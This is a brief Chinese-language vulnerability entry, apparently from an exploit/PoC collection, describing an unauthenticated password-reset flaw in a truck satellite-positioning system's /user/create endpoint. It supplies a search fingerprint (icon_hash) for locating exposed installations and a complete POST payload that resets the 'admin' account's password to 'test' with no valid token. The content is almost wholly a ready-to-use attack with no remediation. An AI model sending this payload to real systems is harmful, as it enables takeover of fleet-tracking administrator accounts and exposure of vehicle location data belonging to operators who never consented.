# 卡车卫星定位系统_user_create存在未授权密码重置漏洞

卡车卫星定位系统_user_create ｜ 未授权访问 ｜ —
- **指纹**：`icon_hash="1553867732"`
- **请求**：`POST /user/create HTTP/1.1`

**Payload**
```
account=admin&id=1&password=test&passwordRepeat=test&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token=
```